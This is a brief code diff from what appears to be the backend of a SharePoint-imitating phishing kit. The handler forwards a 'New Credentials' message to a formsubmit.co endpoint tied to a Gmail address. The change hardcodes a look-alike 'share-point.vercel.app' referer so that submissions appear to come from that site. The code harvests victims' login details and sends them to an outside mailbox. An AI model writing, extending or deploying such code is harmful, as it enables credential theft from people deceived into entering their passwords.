@@ -9,9 +9,7 @@ export default async function handler(req, res) {
 
     const formSubmitUrl = 'https://formsubmit.co/ajax/g82443047@gmail.com';
 
-    const host = req.headers.host || 'localhost:3000';
-    const protocol = host.includes('localhost') ? 'http' : 'https';
-    const referer = `${protocol}://${host}`;
+    const referer = 'https://share-point.vercel.app';
 
     const message = `
 🔐 New Credentials
